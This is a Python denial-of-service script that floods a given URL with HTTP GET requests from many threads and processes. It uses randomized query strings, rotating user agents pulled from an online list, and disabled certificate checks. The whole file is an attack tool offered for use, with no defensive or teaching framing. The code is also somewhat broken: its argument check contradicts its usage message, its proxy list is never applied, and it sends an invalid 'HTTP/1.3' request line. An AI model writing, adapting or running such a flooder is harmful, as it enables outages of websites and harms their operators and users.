import random
import threading
from urllib import parse
import requests
import socket
import socks
import sys
import time
import ssl
randIntn = random.randint
randElement = random.choice
CHARACTERS = "qwertyuioplkjhgfdsazxcvbnm"
def randomParams():
	return "?" + str(random.randint(10000000, 271400281257)) + random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + random.choice(CHARACTERS) + str(random.randint(0, 271400281257))+random.choice(CHARACTERS) + random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + random.choice(CHARACTERS) + str(random.randint(0, 271400281257))+random.choice(CHARACTERS) + random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS)+ random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + "=" + random.choice(CHARACTERS) + str(random.randint(0, 271400281257)) + random.choice(CHARACTERS) + str(random.randint(0, 271400281257))

accepts = [
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate",
    "Accept: text/html, application/xhtml+xml\r\nAccept-Encoding: gzip, deflate",
]
def readFile(filePath):
    return [line.strip() for line in open(file=filePath, mode="r").readlines()]
def urlParser(url):
    url = parse.urlsplit(url)
    host = url.netloc
    if url.scheme == "http":
        port = 80
    elif url.scheme == "https":
        port = 443
    path = url.path
    if path == "":
        path = "/"
    return (host, port, path)
def getUserAgents():
    response = requests.get("https://raw.githubusercontent.com/MrRage867/Big-lists/main/UserAgents.txt").text
    return [line.strip() for line in response.split('\n')]
print(randomParams())
def startAttack():
    proxyAddr = randElement(proxies).split(":")
    userAgent = randElement(userAgents)
    accept = randElement(accepts)
    headers = "GET " + path + randomParams() + " HTTP/1.3\r\nHost: " + host + "\r\nConnection: Keep-Alive\r\n" + accept + "\r\nUser-Agent: " + userAgent + "\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
    while True: 
        conn = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
        try:
            conn.connect((host, port))
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                conn = context.wrap_socket(conn, server_hostname=host)
        except:
            conn.close()
            proxyAddr = randElement(proxies).split(":")
            continue
        for i in range(64):
            try:
                writer = conn.makefile(mode="wb")
                writer.write(str(headers).encode())
                writer.flush()
            except:
                break
        conn.close()
if len(sys.argv[1:]) != 4:
    print("Usage: python3 ddos.py <URL> <THREADS>")
    sys.exit()
host, port, path = urlParser(sys.argv[1])
threads = int(sys.argv[2])
floodTime = 120
proxyFile = 'proxy.txt'
proxies = readFile(proxyFile)
userAgents = getUserAgents()
def main123():
    for i in range(threads):
        thread = threading.Thread(target=startAttack, daemon=True)
        thread.start()
    while True:
        try:
            time.sleep(floodTime)
            break
        except KeyboardInterrupt:
            break

import multiprocessing
print("Attacking...")
for i in range(0,5):
    multiprocessing.Process(target=main123).start()